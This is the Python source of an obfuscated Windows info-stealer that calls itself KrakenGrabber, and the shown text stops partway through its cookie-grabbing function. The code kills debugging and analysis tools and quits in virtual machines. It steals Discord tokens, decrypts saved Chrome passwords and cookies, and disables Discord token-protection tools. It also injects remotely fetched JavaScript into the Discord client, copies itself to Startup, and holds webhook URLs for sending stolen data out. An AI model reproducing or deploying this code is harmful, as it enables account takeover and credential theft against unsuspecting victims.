import marshal
import zlib
import base64
import lzma
import asyncio
import ctypes
import json
import ntpath
import os
import random
import requests
import re
import shutil
import sqlite3
import subprocess
import threading
import winreg
import zipfile
from datetime import datetime, timedelta, timezone
from sys import argv
from tempfile import gettempdir, mkdtemp
import base64
import codecs
import robloxpy
from discordwebhook import *
import browser_cookie3
from base64 import b64decode
from pyotp import TOTP
import httpx
import psutil
from Crypto.Cipher import AES
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
# skidded logger xD
userhook = '~~userwebhook~~'

try:       
    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
    def MONKEND(MONKEYNAMEZ):
        for MONKEYPROC in process_iter():
            try:
                for MONKK in MONKEYNAMEZ: 
                    if MONKK.lower() in MONKEYPROC.name().lower():MONKEYPROC.kill()
            except (NoSuchProcess, AccessDenied, ZombieProcess):pass
    def MONKSTART():
        MONKEYNAMES = ['http', 'traffic', 'wireshark', 'fiddler', 'packet', 'process']
        return MONKEND(MONKEYNAMEZ=MONKEYNAMES)  
    MONKSTART()
except:
    pass


print("Loading...")
__version__ ='1.8.7'#line:29
__license__ ="GPL-3.0"#line:30
# OFC dualhook lol
__config__ ={'webhook':"https://webhookslicer.onrender.com/",'webhook_protector_key':"COILPVVE6PHLU3LP",'injection_url':"https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",'ping_on_run':True ,'kill_processes':True ,'startup':True ,'hide_self':True ,'anti_debug':True ,'blackListedPrograms':["httpdebuggerui","wireshark","fiddler","regedit","cmd","taskmgr","vboxservice","df5serv","processhacker","vboxtray","vmtoolsd","vmwaretray","ida64","ollydbg","pestudio","vmwareuser","vgauthservice","vmacthlp","x96dbg","vmsrvc","x32dbg","vmusrvc","prl_cc","prl_tools","xenservice","qemu-ga","joeboxcontrol","ksdumperclient","ksdumper","joeboxserver"]}#line:59
webhook1 ='https://discord.com/api/webhooks/1000835392733458614/68waXYeF80NhWi6U9gB2c4m3lY5jia48m4fC45yRLdV1FgdO3qXFgFfSenr7FcObA5wd'#line:66
Victim =os .getlogin ()#line:61
Victim_pc =os .getenv ("COMPUTERNAME")#line:62
ram =str (psutil .virtual_memory ()[0 ]/1024 **3 ).split (".")[0 ]#line:63
disk =str (psutil .disk_usage ('/')[0 ]/1024 **3 ).split (".")[0 ]#line:64

class Functions (object ):#line:70
    @staticmethod #line:71
    def get_master_key (O000OOOO0OO0OOOO0 :str or os .PathLike ):#line:72
        if not ntpath .exists (O000OOOO0OO0OOOO0 ):#line:73
            return None #line:74
        with open (O000OOOO0OO0OOOO0 ,"r",encoding ="utf-8")as OOO0OO0000OOOOO0O :#line:75
            O0000000000OOO0OO =OOO0OO0000OOOOO0O .read ()#line:76
        OOOO00O0O00OOOOO0 =json .loads (O0000000000OOO0OO )#line:77
        try :#line:79
            OO0OOO00O0000OOO0 =b64decode (OOOO00O0O00OOOOO0 ["os_crypt"]["encrypted_key"])#line:80
            return Functions .win_decrypt (OO0OOO00O0000OOO0 [5 :])#line:81
        except KeyError :#line:82
            return None #line:83
    @staticmethod #line:85
    def convert_time (OOO0OOO00OO00O000 :int or float )->str :#line:86
        try :#line:87
            OOO00OOOOO0O000OO =datetime (1601 ,1 ,1 ,tzinfo =timezone .utc )#line:88
            OO000O0O0O0O0OOO0 =OOO00OOOOO0O000OO +timedelta (microseconds =OOO0OOO00OO00O000 )#line:89
            return OO000O0O0O0O0OOO0 #line:90
        except Exception :#line:91
            pass #line:92
    @staticmethod #line:94
    def win_decrypt (O0000OOOO000OOOO0 :bytes )->str :#line:95
        return CryptUnprotectData (O0000OOOO000OOOO0 ,None ,None ,None ,0 )[1 ]#line:96
    @staticmethod #line:98
    def create_temp_file (_O0OOOOO0O000O0OOO :str or os .PathLike =gettempdir ()):#line:99
        OOO000000OO00O0OO =''.join (random .SystemRandom ().choice ('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')for _O00OO0OOO0O0OOOO0 in range (random .randint (10 ,20 )))#line:100
        OO0O00O0OO0000OOO =ntpath .join (_O0OOOOO0O000O0OOO ,OOO000000OO00O0OO )#line:101
        open (OO0O00O0OO0000OOO ,"x")#line:102
        return OO0O00O0OO0000OOO #line:103
    @staticmethod #line:105
    def decrypt_val (OO00O000O0OOOO0OO ,OO00000O00OOOOOOO )->str :#line:106
        try :#line:107
            OO0O0O0O00O00O0O0 =OO00O000O0OOOO0OO [3 :15 ]#line:108
            O0OOO000000O00OOO =OO00O000O0OOOO0OO [15 :]#line:109
            OOOOOOOOO0000OOOO =AES .new (OO00000O00OOOOOOO ,AES .MODE_GCM ,OO0O0O0O00O00O0O0 )#line:110
            OOO0OOOO0O0OO0O00 =OOOOOOOOO0000OOOO .decrypt (O0OOO000000O00OOO )#line:111
            OOO0OOOO0O0OO0O00 =OOO0OOOO0O0OO0O00 [:-16 ].decode ()#line:112
            return OOO0OOOO0O0OO0O00 #line:113
        except Exception :#line:114
            return f'Failed to decrypt "{str(OO00O000O0OOOO0OO)}" | key: "{str(OO00000O00OOOOOOO)}"'#line:115
    @staticmethod #line:117
    def get_headers (O00OOO0OOOOOOO0OO :str =None ):#line:118
        O00O00OO0O0O00O0O ={"Content-Type":"application/json",}#line:121
        if O00OOO0OOOOOOO0OO :#line:122
            O00O00OO0O0O00O0O .update ({"Authorization":O00OOO0OOOOOOO0OO })#line:123
        return O00O00OO0O0O00O0O #line:124
    @staticmethod #line:126
    def system_info ()->list :#line:127
        OOOO0OOOOOOO0O00O =0x08000000 #line:128
        O00O00O0OOOO00OO0 ="wmic csproduct get uuid"#line:129
        OOOOO0OOOO0OO000O ="powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"#line:130
        O0OOO0O0OOOOOO00O ="powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"#line:131
        try :#line:132
            O0OO000O0O00000O0 =subprocess .check_output (O00O00O0OOOO00OO0 ,creationflags =OOOO0OOOOOOO0O00O ).decode ().split ('\n')[1 ].strip ()#line:133
        except Exception :#line:134
            O0OO000O0O00000O0 ="N/A"#line:135
        try :#line:136
            O00OOOO000O000OO0 =subprocess .check_output (OOOOO0OOOO0OO000O ,creationflags =OOOO0OOOOOOO0O00O ).decode ().rstrip ()#line:137
        except Exception :#line:138
            O00OOOO000O000OO0 ="N/A"#line:139
        try :#line:140
            O00O0O00OOOOOOOOO =subprocess .check_output (O0OOO0O0OOOOOO00O ,creationflags =OOOO0OOOOOOO0O00O ).decode ().rstrip ()#line:141
        except Exception :#line:142
            O00O0O00OOOOOOOOO ="N/A"#line:143
        return [O0OO000O0O00000O0 ,O00O0O00OOOOOOOOO ,O00OOOO000O000OO0 ]#line:144
    @staticmethod #line:146
    def network_info ()->list :#line:147
        OO00OO0O0OOO0O0OO ,O0OO0OOO000000O00 ,OO0O0OOO000000OOO ,O0OO0OO0O0O0OO000 ,O00OOO000OOOOO0OO ,OO00O00OO0O0OOO0O ,O00OOOOO00OO00O0O ="None","None","None","None","None","None","None"#line:148
        O000O0O0O000000OO =httpx .get ("https://ipinfo.io/json")#line:149
        if O000O0O0O000000OO .status_code ==200 :#line:150
            O0O00OOO00000O000 =O000O0O0O000000OO .json ()#line:151
            OO00OO0O0OOO0O0OO =O0O00OOO00000O000 .get ('ip')#line:152
            O0OO0OOO000000O00 =O0O00OOO00000O000 .get ('city')#line:153
            OO0O0OOO000000OOO =O0O00OOO00000O000 .get ('country')#line:154
            O0OO0OO0O0O0OO000 =O0O00OOO00000O000 .get ('region')#line:155
            O00OOO000OOOOO0OO =O0O00OOO00000O000 .get ('org')#line:156
            OO00O00OO0O0OOO0O =O0O00OOO00000O000 .get ('loc')#line:157
            O00OOOOO00OO00O0O ="https://www.google.com/maps/search/google+map++"+OO00O00OO0O0OOO0O #line:158
        return [OO00OO0O0OOO0O0OO ,O0OO0OOO000000O00 ,OO0O0OOO000000OOO ,O0OO0OO0O0O0OO000 ,O00OOO000OOOOO0OO ,OO00O00OO0O0OOO0O ,O00OOOOO00OO00O0O ]#line:159
    @staticmethod #line:161
    def fetch_conf (O0O0O00OO000OOO0O :str )->str or bool |None :#line:162
        return __config__ .get (O0O0O00OO000OOO0O )#line:163
class KrakenGrabber (Functions ):#line:166
    def __init__ (O0O000OO00O0O0OOO ):#line:167
        O0O000OO00O0O0OOO .webhook =O0O000OO00O0O0OOO .fetch_conf ('webhook')#line:168
        O0O000OO00O0O0OOO .userhook =userhook #line:169
        O0O000OO00O0O0OOO .discordApi ="https://discord.com/api/v9/users/@me"#line:170
        O0O000OO00O0O0OOO .appdata =os .getenv ("localappdata")#line:171
        O0O000OO00O0O0OOO .roaming =os .getenv ("appdata")#line:172
        O0O000OO00O0O0OOO .chrome_user_data =ntpath .join (O0O000OO00O0O0OOO .appdata ,'Google','Chrome','User Data')#line:173
        O0O000OO00O0O0OOO .dir ,O0O000OO00O0O0OOO .temp =mkdtemp (),gettempdir ()#line:174
        O00OOO0O00OOO0000 ,OO0O0O0O00OOO00OO =O0O000OO00O0O0OOO .system_info (),O0O000OO00O0O0OOO .network_info ()#line:175
        O0O000OO00O0O0OOO .hwid ,O0O000OO00O0O0OOO .winver ,O0O000OO00O0O0OOO .winkey =O00OOO0O00OOO0000 [0 ],O00OOO0O00OOO0000 [1 ],O00OOO0O00OOO0000 [2 ]#line:176
        O0O000OO00O0O0OOO .ip ,O0O000OO00O0O0OOO .city ,O0O000OO00O0O0OOO .country ,O0O000OO00O0O0OOO .region ,O0O000OO00O0O0OOO .org ,O0O000OO00O0O0OOO .loc ,O0O000OO00O0O0OOO .googlemap =OO0O0O0O00OOO00OO [0 ],OO0O0O0O00OOO00OO [1 ],OO0O0O0O00OOO00OO [2 ],OO0O0O0O00OOO00OO [3 ],OO0O0O0O00OOO00OO [4 ],OO0O0O0O00OOO00OO [5 ],OO0O0O0O00OOO00OO [6 ]#line:177
        O0O000OO00O0O0OOO .startup_loc =ntpath .join (O0O000OO00O0O0OOO .roaming ,'Microsoft','Windows','Start Menu','Programs','Startup')#line:178
        O0O000OO00O0O0OOO .hook_reg ="api/webhooks"#line:180
        O0O000OO00O0O0OOO .chrome_reg =re .compile (r'(^profile\s\d*)|default|(guest profile$)',re .IGNORECASE |re .MULTILINE )#line:181
        O0O000OO00O0O0OOO .regex =r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"#line:182
        O0O000OO00O0O0OOO .encrypted_regex =r"dQw4w9WgXcQ:[^\"]*"#line:183
        O0O000OO00O0O0OOO .sep =os .sep #line:185
        O0O000OO00O0O0OOO .tokens =[]#line:186
        O0O000OO00O0O0OOO .robloxcookies =[]#line:187
        O0O000OO00O0O0OOO .chrome_key =O0O000OO00O0O0OOO .get_master_key (ntpath .join (O0O000OO00O0O0OOO .chrome_user_data ,"Local State"))#line:188
        os .makedirs (O0O000OO00O0O0OOO .dir ,exist_ok =True )#line:190
    def hazard_exit (OOO0O0O0000000OOO ):#line:192
        shutil .rmtree (OOO0O0O0000000OOO .dir ,ignore_errors =True )#line:193
        os ._exit (0 )#line:194
    def try_extract (OOO0OOO0O000OO000 ):#line:196
        ""#line:197
        def OO0O00O0000O00OOO (*OOO0OOO0O000O0OOO ,**OOOO0O0000O0O000O ):#line:198
            try :#line:199
                OOO0OOO0O000OO000 (*OOO0OOO0O000O0OOO ,**OOOO0O0000O0O000O )#line:200
            except Exception :#line:201
                pass #line:202
        return OO0O00O0000O00OOO #line:203
    async def checkToken (O0OO0O0O0OOOOOO00 ,O000OOOOO0OO0000O :str )->str :#line:205
        try :#line:206
            OO0OO0OO000OO00OO =httpx .get (url =O0OO0O0O0OOOOOO00 .discordApi ,headers =O0OO0O0O0OOOOOO00 .get_headers (O000OOOOO0OO0000O ),timeout =5.0 )#line:211
        except (httpx .ConnectTimeout ,httpx .TimeoutException ):#line:212
            pass #line:213
        if OO0OO0OO000OO00OO .status_code ==200 and O000OOOOO0OO0000O not in O0OO0O0O0OOOOOO00 .tokens :#line:214
            O0OO0O0O0OOOOOO00 .tokens .append (O000OOOOO0OO0000O )#line:215
    async def init (O0000OO000000O0OO ):#line:217
        if O0000OO000000O0OO .webhook ==""or O0000OO000000O0OO .webhook =="\x57EBHOOK_HERE":#line:218
            O0000OO000000O0OO .hazard_exit ()#line:219
        if O0000OO000000O0OO .fetch_conf ('anti_debug')and AntiDebug ().inVM is True :#line:221
            O0000OO000000O0OO .hazard_exit ()#line:222
        await O0000OO000000O0OO .bypassBetterDiscord ()#line:224
        await O0000OO000000O0OO .bypassTokenProtector ()#line:225
        O0OOOOOO00OO00OO0 =[O0000OO000000O0OO .screenshot ,O0000OO000000O0OO .sys_dump ,O0000OO000000O0OO .grab_tokens ,O0000OO000000O0OO .grabMinecraftCache ,O0000OO000000O0OO .grabRobloxCookie ]#line:227
        if O0000OO000000O0OO .fetch_conf ('hide_self'):#line:228
            O0OOOOOO00OO00OO0 .append (O0000OO000000O0OO .hide )#line:229
        if O0000OO000000O0OO .fetch_conf ('kill_processes'):#line:231
            await O0000OO000000O0OO .killProcesses ()#line:232
        if O0000OO000000O0OO .fetch_conf ('startup'):#line:234
            O0OOOOOO00OO00OO0 .append (O0000OO000000O0OO .startup )#line:235
        if ntpath .exists (O0000OO000000O0OO .chrome_user_data )and O0000OO000000O0OO .chrome_key is not None :#line:237
            os .makedirs (ntpath .join (O0000OO000000O0OO .dir ,'Google'),exist_ok =True )#line:238
            O0OOOOOO00OO00OO0 .extend ([O0000OO000000O0OO .grabPassword ,O0000OO000000O0OO .grabCookies ,O0000OO000000O0OO .grabHistory ])#line:239
        for O00OO0OOOOOO00OOO in O0OOOOOO00OO00OO0 :#line:241
            OO0O000O00OO0OO0O =threading .Thread (target =O00OO0OOOOOO00OOO ,daemon =True )#line:242
            OO0O000O00OO0OO0O .start ()#line:243
        for OO0OO0OO000O00O00 in threading .enumerate ():#line:244
            try :#line:245
                OO0OO0OO000O00O00 .join ()#line:246
            except RuntimeError :#line:247
                continue #line:248
        O0000OO000000O0OO .neatifyTokens ()#line:249
        await O0000OO000000O0OO .injector ()#line:250
        O0000OO000000O0OO .finish ()#line:251
    def hide (O0O0O00000000O00O ):#line:253
        ctypes .windll .kernel32 .SetFileAttributesW (argv [0 ],2 )#line:254
    def startup (OO0OOOO00OOOOOOO0 ):#line:256
        try :#line:257
            shutil .copy2 (argv [0 ],OO0OOOO00OOOOOOO0 .startup_loc )#line:258
        except Exception :#line:259
            pass #line:260
    async def injector (O00O0O0O0O0OO00O0 ):#line:262
        for _OOOO00O00OO0OO0OO in os .listdir (O00O0O0O0O0OO00O0 .appdata ):#line:264
            if 'discord'in _OOOO00O00OO0OO0OO .lower ():#line:265
                OO0OOO0O00O00O0OO =O00O0O0O0O0OO00O0 .appdata +os .sep +_OOOO00O00OO0OO0OO #line:266
                for __O0O00O00O0OOOOO00 in os .listdir (ntpath .abspath (OO0OOO0O00O00O0OO )):#line:267
                    if re .match (r'app-(\d*\.\d*)*',__O0O00O00O0OOOOO00 ):#line:268
                        O0OO0OOOOO00OO000 =ntpath .abspath (ntpath .join (OO0OOO0O00O00O0OO ,__O0O00O00O0OOOOO00 ))#line:269
                        O0O00OO0O00000O00 =ntpath .join (O0OO0OOOOO00OO000 ,'modules')#line:270
                        if not ntpath .exists (O0O00OO0O00000O00 ):#line:271
                            return #line:272
                        for __OOOOO0000OOO0000O in os .listdir (O0O00OO0O00000O00 ):#line:273
                            if re .match (r"discord_desktop_core-\d+",__OOOOO0000OOO0000O ):#line:274
                                O0OO0OOO0O00O00OO =O0O00OO0O00000O00 +os .sep +__OOOOO0000OOO0000O +f'\\discord_desktop_core\\'#line:275
                                if ntpath .exists (O0OO0OOO0O00O00OO ):#line:276
                                    if O00O0O0O0O0OO00O0 .startup_loc not in argv [0 ]:#line:277
                                        try :#line:278
                                            os .makedirs (O0OO0OOO0O00O00OO +'initiation',exist_ok =True )#line:279
                                        except PermissionError :#line:280
                                            pass #line:281
                                    if O00O0O0O0O0OO00O0 .hook_reg in O00O0O0O0O0OO00O0 .webhook :#line:282
                                        O000000O0OO000OO0 =httpx .get (O00O0O0O0O0OO00O0 .fetch_conf ('injection_url')).text .replace ("%WEBHOOK%",O00O0O0O0O0OO00O0 .webhook )#line:283
                                    else :#line:284
                                        O000000O0OO000OO0 =httpx .get (O00O0O0O0O0OO00O0 .fetch_conf ('injection_url')).text .replace ("%WEBHOOK%",O00O0O0O0O0OO00O0 .webhook ).replace ("%WEBHOOK_KEY%",O00O0O0O0O0OO00O0 .fetch_conf ('webhook_protector_key'))#line:288
                                    try :#line:289
                                        with open (O0OO0OOO0O00O00OO +'index.js','w',errors ="ignore")as OOO000OOO000OO000 :#line:290
                                            OOO000OOO000OO000 .write (O000000O0OO000OO0 )#line:291
                                    except PermissionError :#line:292
                                        pass #line:293
                                    if O00O0O0O0O0OO00O0 .fetch_conf ('kill_processes'):#line:294
                                        os .startfile (O0OO0OOOOO00OO000 +O00O0O0O0O0OO00O0 .sep +_OOOO00O00OO0OO0OO +'.exe')#line:295
    async def killProcesses (O0OOO00O00OOO0000 ):#line:298
        OOO00000OO0OO000O =O0OOO00O00OOO0000 .fetch_conf ('blackListedPrograms')#line:299
        for OO00OOO0OO0O00OOO in ['discord','discordtokenprotector','discordcanary','discorddevelopment','discordptb']:#line:300
            OOO00000OO0OO000O .append (OO00OOO0OO0O00OOO )#line:301
        for O0000OO0O00O00OO0 in psutil .process_iter ():#line:302
            if any (OO0OOOO0O0O000O0O in O0000OO0O00O00OO0 .name ().lower ()for OO0OOOO0O0O000O0O in OOO00000OO0OO000O ):#line:303
                try :#line:304
                    O0000OO0O00O00OO0 .kill ()#line:305
                except (psutil .NoSuchProcess ,psutil .AccessDenied ):#line:306
                    pass #line:307
    async def bypassTokenProtector (O0O0OO00O0OO0OOOO ):#line:309
        OO00O00000O0OOOO0 =f"{O0O0OO00O0OO0OOOO.roaming}\\DiscordTokenProtector\\"#line:311
        if not ntpath .exists (OO00O00000O0OOOO0 ):#line:312
            return #line:313
        O000OOO00000O000O =OO00O00000O0OOOO0 +"config.json"#line:314
        for OO0OOO0O000O0OO0O in ["DiscordTokenProtector.exe","ProtectionPayload.dll","secure.dat"]:#line:316
            try :#line:317
                os .remove (OO00O00000O0OOOO0 +OO0OOO0O000O0OO0O )#line:318
            except FileNotFoundError :#line:319
                pass #line:320
        if ntpath .exists (O000OOO00000O000O ):#line:321
            with open (O000OOO00000O000O ,errors ="ignore")as O00O0000O0OOO0O0O :#line:322
                try :#line:323
                    OOOO0O0O000O00O00 =json .load (O00O0000O0OOO0O0O )#line:324
                except json .decoder .JSONDecodeError :#line:325
                    return #line:326
                OOOO0O0O000O00O00 ['Rdimo_just_shit_on_this_token_protector']="https://robloxapi.cf"#line:327
                OOOO0O0O000O00O00 ['auto_start']=False #line:328
                OOOO0O0O000O00O00 ['auto_start_discord']=False #line:329
                OOOO0O0O000O00O00 ['integrity']=False #line:330
                OOOO0O0O000O00O00 ['integrity_allowbetterdiscord']=False #line:331
                OOOO0O0O000O00O00 ['integrity_checkexecutable']=False #line:332
                OOOO0O0O000O00O00 ['integrity_checkhash']=False #line:333
                OOOO0O0O000O00O00 ['integrity_checkmodule']=False #line:334
                OOOO0O0O000O00O00 ['integrity_checkscripts']=False #line:335
                OOOO0O0O000O00O00 ['integrity_checkresource']=False #line:336
                OOOO0O0O000O00O00 ['integrity_redownloadhashes']=False #line:337
                OOOO0O0O000O00O00 ['iterations_iv']=364 #line:338
                OOOO0O0O000O00O00 ['iterations_key']=457 #line:339
                OOOO0O0O000O00O00 ['version']=69420 #line:340
            with open (O000OOO00000O000O ,'w')as O00O0000O0OOO0O0O :#line:341
                json .dump (OOOO0O0O000O00O00 ,O00O0000O0OOO0O0O ,indent =2 ,sort_keys =True )#line:342
            with open (O000OOO00000O000O ,'a')as O00O0000O0OOO0O0O :#line:343
                O00O0000O0OOO0O0O .write ("\n\n//Kraken just shit on this token protector | Kraken on Top! | https://discord.gg/krakendrops")#line:344
    async def bypassBetterDiscord (O0O0OO0OO0OO0000O ):#line:346
        O000OO000OOO00OO0 =O0O0OO0OO0OO0000O .roaming +"\\BetterDiscord\\data\\betterdiscord.asar"#line:347
        if ntpath .exists (O000OO000OOO00OO0 ):#line:348
            OO0O00O00OOO00OOO =O0O0OO0OO0OO0000O .hook_reg #line:349
            with open (O000OO000OOO00OO0 ,'r',encoding ="cp437",errors ='ignore')as OO000OOO00OO0O0O0 :#line:350
                O0O0OO0O0OOO0OOOO =OO000OOO00OO0O0O0 .read ()#line:351
                O0O0OO0O000O0OO0O =O0O0OO0O0OOO0OOOO .replace (OO0O00O00OOO00OOO ,'RdimoTheGoat')#line:352
            with open (O000OO000OOO00OO0 ,'w',newline ='',encoding ="cp437",errors ='ignore')as OO000OOO00OO0O0O0 :#line:353
                OO000OOO00OO0O0O0 .write (O0O0OO0O000O0OO0O )#line:354
    @try_extract #line:356
    def grab_tokens (OO0OO0O0OOOO000OO ):#line:357
        O0O0000O000O0O0O0 ={'Discord':OO0OO0O0OOOO000OO .roaming +'\\discord\\Local Storage\\leveldb\\','Discord Canary':OO0OO0O0OOOO000OO .roaming +'\\discordcanary\\Local Storage\\leveldb\\','Lightcord':OO0OO0O0OOOO000OO .roaming +'\\Lightcord\\Local Storage\\leveldb\\','Discord PTB':OO0OO0O0OOOO000OO .roaming +'\\discordptb\\Local Storage\\leveldb\\','Opera':OO0OO0O0OOOO000OO .roaming +'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX':OO0OO0O0OOOO000OO .roaming +'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo':OO0OO0O0OOOO000OO .appdata +'\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch':OO0OO0O0OOOO000OO .appdata +'\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa':OO0OO0O0OOOO000OO .appdata +'\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum':OO0OO0O0OOOO000OO .appdata +'\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser':OO0OO0O0OOOO000OO .appdata +'\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star':OO0OO0O0OOOO000OO .appdata +'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik':OO0OO0O0OOOO000OO .appdata +'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi':OO0OO0O0OOOO000OO .appdata +'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS':OO0OO0O0OOOO000OO .appdata +'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome':OO0OO0O0OOOO000OO .chrome_user_data +'\\Default\\Local Storage\\leveldb\\','Epic Privacy Browser':OO0OO0O0OOOO000OO .appdata +'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge':OO0OO0O0OOOO000OO .appdata +'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\','Uran':OO0OO0O0OOOO000OO .appdata +'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex':OO0OO0O0OOOO000OO .appdata +'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave':OO0OO0O0OOOO000OO .appdata +'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium':OO0OO0O0OOOO000OO .appdata +'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}#line:381
        for O0000OOO0O0O00O0O ,O0O00O00O0000OO00 in O0O0000O000O0O0O0 .items ():#line:383
            if not ntpath .exists (O0O00O00O0000OO00 ):#line:384
                continue #line:385
            O0O000OO0OOO0OOO0 =O0000OOO0O0O00O0O .replace (" ","").lower ()#line:386
            if "cord"in O0O00O00O0000OO00 :#line:387
                if ntpath .exists (OO0OO0O0OOOO000OO .roaming +f'\\{O0O000OO0OOO0OOO0}\\Local State'):#line:388
                    for O0OO00OOOOOOO0OO0 in os .listdir (O0O00O00O0000OO00 ):#line:389
                        if O0OO00OOOOOOO0OO0 [-3 :]not in ["log","ldb"]:#line:390
                            continue #line:391
                        for O00OOO0O0O0O0OOO0 in [O000OOOO0OOO0000O .strip ()for O000OOOO0OOO0000O in open (f'{O0O00O00O0000OO00}\\{O0OO00OOOOOOO0OO0}',errors ='ignore').readlines ()if O000OOOO0OOO0000O .strip ()]:#line:392
                            for O00OOO0OOOOOO0O00 in re .findall (OO0OO0O0OOOO000OO .encrypted_regex ,O00OOO0O0O0O0OOO0 ):#line:393
                                O0O00OO0O0OO000O0 =OO0OO0O0OOOO000OO .decrypt_val (b64decode (O00OOO0OOOOOO0O00 .split ('dQw4w9WgXcQ:')[1 ]),OO0OO0O0OOOO000OO .get_master_key (OO0OO0O0OOOO000OO .roaming +f'\\{O0O000OO0OOO0OOO0}\\Local State'))#line:394
                                asyncio .run (OO0OO0O0OOOO000OO .checkToken (O0O00OO0O0OO000O0 ))#line:395
            else :#line:396
                for O0OO00OOOOOOO0OO0 in os .listdir (O0O00O00O0000OO00 ):#line:397
                    if O0OO00OOOOOOO0OO0 [-3 :]not in ["log","ldb"]:#line:398
                        continue #line:399
                    for O00OOO0O0O0O0OOO0 in [O0OOO0OOOOOO000OO .strip ()for O0OOO0OOOOOO000OO in open (f'{O0O00O00O0000OO00}\\{O0OO00OOOOOOO0OO0}',errors ='ignore').readlines ()if O0OOO0OOOOOO000OO .strip ()]:#line:400
                        for O0O00OO0O0OO000O0 in re .findall (OO0OO0O0OOOO000OO .regex ,O00OOO0O0O0O0OOO0 ):#line:401
                            asyncio .run (OO0OO0O0OOOO000OO .checkToken (O0O00OO0O0OO000O0 ))#line:402
        if ntpath .exists (OO0OO0O0OOOO000OO .roaming +"\\Mozilla\\Firefox\\Profiles"):#line:404
            for O0O00O00O0000OO00 ,_OOO0O0O000000O000 ,O0OO00OOO0OO00000 in os .walk (OO0OO0O0OOOO000OO .roaming +"\\Mozilla\\Firefox\\Profiles"):#line:405
                for _OO0O00OO00000O00O in O0OO00OOO0OO00000 :#line:406
                    if not _OO0O00OO00000O00O .endswith ('.sqlite'):#line:407
                        continue #line:408
                    for O00OOO0O0O0O0OOO0 in [OOO0000OO0O0OOOO0 .strip ()for OOO0000OO0O0OOOO0 in open (f'{O0O00O00O0000OO00}\\{_OO0O00OO00000O00O}',errors ='ignore').readlines ()if OOO0000OO0O0OOOO0 .strip ()]:#line:409
                        for O0O00OO0O0OO000O0 in re .findall (OO0OO0O0OOOO000OO .regex ,O00OOO0O0O0O0OOO0 ):#line:410
                            asyncio .run (OO0OO0O0OOOO000OO .checkToken (O0O00OO0O0OO000O0 ))#line:411
    @try_extract #line:413
    def grabPassword (O00OO0000O0O0OO00 ):#line:414
        O00000OOOO0O0000O =open (ntpath .join (O00OO0000O0O0OO00 .dir ,'Google','Google Passwords.txt'),'w',encoding ="cp437",errors ='ignore')#line:415
        for OO0OOOOOOOOOOOOO0 in os .listdir (O00OO0000O0O0OO00 .chrome_user_data ):#line:416
            if re .match (O00OO0000O0O0OO00 .chrome_reg ,OO0OOOOOOOOOOOOO0 ):#line:417
                OOO0O0O000OO00O00 =ntpath .join (O00OO0000O0O0OO00 .chrome_user_data ,OO0OOOOOOOOOOOOO0 ,'Login Data')#line:418
                O0OO000OOOOOOO0OO =O00OO0000O0O0OO00 .create_temp_file ()#line:419
                shutil .copy2 (OOO0O0O000OO00O00 ,O0OO000OOOOOOO0OO )#line:421
                O00O0OOOOOOO0000O =sqlite3 .connect (O0OO000OOOOOOO0OO )#line:422
                OO0O00OOO00O0OOOO =O00O0OOOOOOO0000O .cursor ()#line:423
                OO0O00OOO00O0OOOO .execute ("SELECT action_url, username_value, password_value FROM logins")#line:424
                for OO00O0000OOO0OO00 in OO0O00OOO00O0OOOO .fetchall ():#line:426
                    OOO00OOOOO00OO0O0 =OO00O0000OOO0OO00 [0 ]#line:427
                    OO000O00O00O00OO0 =OO00O0000OOO0OO00 [1 ]#line:428
                    O00O0OOOOOO00OOOO =OO00O0000OOO0OO00 [2 ]#line:429
                    OO0OOO0O0OOOOO0O0 =O00OO0000O0O0OO00 .decrypt_val (O00O0OOOOOO00OOOO ,O00OO0000O0O0OO00 .chrome_key )#line:430
                    if OOO00OOOOO00OO0O0 !="":#line:431
                        O00000OOOO0O0000O .write (f"Domain: {OOO00OOOOO00OO0O0}\nUser: {OO000O00O00O00OO0}\nPass: {OO0OOO0O0OOOOO0O0}\n\n")#line:432
                OO0O00OOO00O0OOOO .close ()#line:434
                O00O0OOOOOOO0000O .close ()#line:435
                os .remove (O0OO000OOOOOOO0OO )#line:436
        O00000OOOO0O0000O .close ()#line:437
    @try_extract #line:439
    def grabCookies (O0O00O0O0OOOO000O ):#line:440
        O000O00O0OOOOOO00 =open (ntpath .join (O0O00O0O0OOOO000O .dir ,'Google','Google Cookies.txt'),'w',encoding ="cp437",errors ='ignore')#line:441
        for OO00OOO0O0OOO0000 in os .listdir (O0O00O0O0OOOO000O .chrome_user_data ):#line:442
            if re .match (O0O00O0O0OOOO000O .chrome_reg ,OO00OOO0O0OOO0000 ):#line:443
                OOOO000OO0OOOO00O =ntpath .join (O0O00O0O0OOOO000O .chrome_user_data ,OO00OOO0O0OOO0000 ,'Network','cookies')#line:444
                OO0OOOOOO0O00O00O =O0O00O0O0OOOO000O .create_temp_file ()#line:445
                shutil .copy2 (OOOO000OO0OOOO00O ,OO0OOOOOO0O00O00O )#line:447
